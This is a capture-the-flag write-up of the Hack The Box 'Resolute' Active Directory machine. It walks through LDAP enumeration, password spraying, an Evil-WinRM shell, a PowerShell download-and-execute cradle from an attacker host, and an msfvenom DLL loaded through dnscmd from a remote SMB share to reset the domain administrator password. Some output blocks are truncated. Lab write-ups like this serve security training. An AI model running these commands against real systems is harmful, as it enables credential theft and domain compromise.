{% include toc icon="cog" title="Resolute Solution" %}

The [Resolute](https://app.hackthebox.com/machines/Resolute) machine has been created by [egre55](https://app.hackthebox.com/users/1190). This is a **medium** Windows Machine with a strong focus on Active Directory exploitation. This box was interesting as it showed how to get high privileges using **DnsAdmins** permissions.

If you didn't solve this challenge and just look for answers, first you should take a look at this [mind map](https://github.com/Orange-Cyberdefense/ocd-mindmaps/blob/main/img/pentest_ad_dark_2023_02.svg) from [Orange Cyberdefense](https://github.com/Orange-Cyberdefense) and try again. It could give you some hints for attack paths when dealing with an Active Directory.

**Note:** All the actions performed against the target machine have been done with a standard *Kali Linux* machine. You can download Kali from the official website [here](https://www.kali.org/).

# Reconnaissance

In a penetration test or red team, reconnaissance consists of techniques that involve adversaries actively or passively gathering information that can be used to support targeting. 

This information can then be leveraged by an adversary to aid in other phases of the adversary lifecycle, such as using gathered information to plan and execute initial access, to scope and prioritize post-compromise objectives, or to drive and lead further reconnaissance efforts. Here, our only piece of information is an IP address. 

## Scan with Nmap

Let's start with a classic service scan with [Nmap](https://nmap.org/) in order to reveal some of the ports open on the machine.

**Note:** Always allow a few minutes after the start of an HTB box to make sure that all the services are properly running. If you scan the machine right away, you may miss some ports that should be open.

{: .notice--warning}

As we can see, the output reveals an **LDAP** (TCP/389) port with the **megabank.local** domain name. Let's see if we can extract some users.

## LDAP

First, we can try an anonymous bind on the LDAP port using [ldapsearch](https://linux.die.net/man/1/ldapsearch) to look for some information. Here, we used the `grep` command to look for the **userPrincipalName** attribute that specifies the UPN of the users.

```bash
$ ldapsearch -x -b "dc=megabank,dc=local" "*" -H ldap://10.129.96.155 | grep userPrincipalName 
userPrincipalName: ryan@megabank.local
userPrincipalName: marko@megabank.local
userPrincipalName: sunita@megabank.local
userPrincipalName: abigail@megabank.local
userPrincipalName: marcus@megabank.local
userPrincipalName: sally@megabank.local
userPrincipalName: fred@megabank.local
userPrincipalName: angela@megabank.local
userPrincipalName: felicia@megabank.local
userPrincipalName: gustavo@megabank.local
userPrincipalName: ulf@megabank.local
userPrincipalName: stevie@megabank.local
userPrincipalName: claire@megabank.local
userPrincipalName: paulo@megabank.local
userPrincipalName: steve@megabank.local
userPrincipalName: annette@megabank.local
userPrincipalName: annika@megabank.local
userPrincipalName: per@megabank.local
userPrincipalName: claude@megabank.local
userPrincipalName: melanie@megabank.local
userPrincipalName: zach@megabank.local
userPrincipalName: simon@megabank.local
userPrincipalName: naoki@megabank.local
```

The *anonymous* bind worked and we got some usernames. Let's dig a bit further, maybe there are interesting things in the **description** field of some of them. 

In real world scenarios, system administrators frequently store passwords for non-personal accounts in the *description* field of the account. However, this field is readable by all users by default in Active Directory.

```bash
$ ldapsearch -x -b "dc=megabank,dc=local" "*" -H ldap://10.129.96.155 | grep -E 'userPrincipalName|description'

...[snip]...

userPrincipalName: ryan@megabank.local
description: Account created. Password set to Welcome123!
userPrincipalName: marko@megabank.local
userPrincipalName: sunita@megabank.local
userPrincipalName: abigail@megabank.local
userPrincipalName: marcus@megabank.local
userPrincipalName: sally@megabank.local

...[snip]...
```

Interesting, the **marko@megabank.local** have a description specifying a cleartext password.

# Initial Access

Now, we can try to get an access using the previously found password and the **marko** account.

```bash
$ crackmapexec smb 10.129.96.155 -d megabank.local -u marko -p 'Welcome123!'
SMB         10.129.96.155   445    RESOLUTE         [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True)
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\marko:Welcome123! STATUS_LOGON_FAILURE 
```

No luck. But, maybe another user is configured with this password as password reuse is fairly common.

## Password Spraying

As stated by [MITRE](https://attack.mitre.org/techniques/T1110/003/), adversaries may use a single or small list of commonly used passwords against many different accounts to attempt to acquire valid account credentials. Password spraying uses one password, or a small list of commonly used passwords, that may match the complexity policy of the domain. Logins are attempted with that password against many different accounts on a network to avoid account lockouts that would normally occur when brute forcing a single account with many passwords.

Here we built a list of usernames and used it in a password spraying attack with [crackmapexec](https://github.com/byt3bl33d3r/CrackMapExec) to see if it yields any results.

```bash
$ crackmapexec smb 10.129.96.155 -d megabank.local -u users.txt -p 'Welcome123!' --continue-on-success
SMB         10.129.96.155   445    RESOLUTE         [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True)
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\ryan:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\marko:Welcome123! STATUS_LOGON_FAILURE 

...[snip]...

SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\annika:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\per:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\claude:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.96.155   445    RESOLUTE         [+] megabank.local\melanie:Welcome123! 
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\zach:Welcome123! STATUS_LOGON_FAILURE 
```

Great, we now have credentials the **melanie** domain account (`melanie:Welcome123!`). 

## WinRM Access

Again, using [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec), we can check if we can get access with WinRM.

```bash
$ crackmapexec winrm 10.129.96.155 -u melanie -p 'Welcome123!' -d megabank.local
HTTP        10.129.96.155   5985   10.129.96.155    [*] http://10.129.96.155:5985/wsman
WINRM       10.129.96.155   5985   10.129.96.155    [+] megabank.local\melanie:Welcome123! (Pwn3d!)
```

The password is valid and we do have a WinRM access to the remote computer. Using [Evil-WinRM](https://github.com/Hackplayers/evil-winrm) and the recovered account, we can try to connect to the remote machine.

```bash
$ evil-winrm -i 10.129.96.155 -u melanie -p 'Welcome123!' 

Evil-WinRM shell v3.3
Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\melanie\Documents> dir ..\Desktop

```

We now have a remote shell access and the **first flag**.

# Privilege Escalation

Privilege Escalation consists of techniques that adversaries use to gain higher-level permissions on a system or network. Adversaries can often enter and explore a network with unprivileged access but require elevated permissions to follow through on their objectives. Common approaches are to take advantage of system weaknesses, misconfigurations, and vulnerabilities.

## Active Directory Recon

With a valid account, we can now use one of the [BloodHound](https://github.com/BloodHoundAD/BloodHound) ingestors and gather more information about the Active Directory. Here, we use a Python based ingestor for BloodHound, [BloodHound.py](https://github.com/fox-it/BloodHound.py).

```bash
$ bloodhound-python -c All -u melanie -p 'Welcome123!' -d megabank.local -ns 10.129.96.155 --zip
INFO: Found AD domain: megabank.local
INFO: Connecting to LDAP server: Resolute.megabank.local
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 2 computers
INFO: Connecting to LDAP server: Resolute.megabank.local
INFO: Found 27 users

INFO: Querying computer: Resolute.megabank.local
INFO: Done in 00M 04S
INFO: Compressing output into 20220207140125_bloodhound.zip
```

Now, you can import the generated file (*20220207140125_bloodhound.zip*) in BloodHound by running `sudo neo4j start`, then execute BloodHound in another terminal with the `bloodhound` command.

## Recon with PrivescCheck

Before going further with our BloodHound results, let’s see if we can elevate our local privileges and get a local administrator access. Using [PrivescCheck](https://github.com/itm4n/PrivescCheck), a script that aims to enumerate common Windows configuration issues, let's try to enumerate common Windows configuration issues that can be leveraged for local privilege escalation.

Note that we used the local **Apache** service to host the file and download it from the remote machine. The `-Extended` flag aims to gather more information.

```bash
*Evil-WinRM* PS C:\Users\melanie\Desktop> IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.xx/PrivescCheck.ps1'); Invoke-PrivescCheck -Extended

```

We may have some interesting information in the **PSTranscipts** folder, let's take a look at this directory.

```bash
*Evil-WinRM* PS C:\> cd C:\PSTranscripts
*Evil-WinRM* PS C:\PSTranscripts> dir -force


    Directory: C:\PSTranscripts

```

One file seems to be present in the **20191203** directory.

```bash
*Evil-WinRM* PS C:\PSTranscripts\20191203> cat PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt

...[snip]...

...[snip]...

```

Nice, we found cleartext credentials for **ryan** in the transcript. Maybe this user has elevated privileges on the domain.

## Domain Compromise with DnsAdmins

According to BloodHound, the user **ryan** is a member of **DnsAdmins**. As stated by this [post](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise), being a member of the DnsAdmins group allows us to use the `dnscmd.exe` to specify a plugin DLL that can be loaded by the DNS service with **SYSTEM** privileges, which means we can do whatever we want!

![image-center](/images/htb/htb_resolute_bloodhound_ryan.png){: .align-center}

Let's create a simple DLL using [msfvenom](https://www.offensive-security.com/metasploit-unleashed/msfvenom/) that changes the **administrator** account password.

```bash
$ cd /tmp
$ msfvenom -p windows/x64/exec CMD='net user administrator Qwerty1! /domain' -f dll -o hello.dll
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 307 bytes
Final size of dll file: 8704 bytes
Saved as: hello.dll
```

As transferring this to the box would likely trigger Windows Defender or any other security solution, we can use [impacket-smbserver](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py) to start an SMB server and host the DLL remotely.

Note that the DLL was placed in the **/tmp** directory of the attacking machine.

```bash
$ impacket-smbserver smb /tmp                      
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

The dnscmd utility can be used to set the remote DLL path into the Windows Registr
```

Now, we can use `evil-winrm` and the **ryan** credentials to load our malicious DLL remotely.

```bash
$ evil-winrm -i 10.129.96.155 -u ryan -p 'Serv3r4Admin4cc123!'

Evil-WinRM shell v3.3
Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\ryan\Documents> cmd.exe /c dnscmd localhost /config /serverlevelplugindll \\10.10.14.62\smb\hello.dll

Registry property serverlevelplugindll successfully reset.
Command completed successfully.
```

Next, we need to restart the DNS service in order to load our malicious DLL. Normally, **DnsAdmins** aren't able to restart the DNS service by default, but it is likely that they would be given permissions to do this and on this domain and this is indeed the case.

```bash
*Evil-WinRM* PS C:\Users\ryan\Documents> sc.exe stop dns

SERVICE_NAME: dns
        TYPE               : 10  WIN32_OWN_PROCESS

        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 2988
        FLAGS              :
```

Now, let's see if the **administrator** password was changed.

```bash
$ crackmapexec smb 10.129.96.155 -d megabank.local -u Administrator -p 'Qwerty1!'
SMB         10.129.96.155   445    RESOLUTE         [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True)

```

Great, we now have valid credentials for the **administrator** account. Then, we can connect on the remote machine with administrative privileges and read the **second flag**.

```bash
$ crackmapexec smb 10.129.96.155 -d megabank.local -u Administrator -p 'Qwerty1!' -x 'dir C:\Users\Administrator\Desktop\'

Awesome! I hope you enjoyed it, I know I did :)
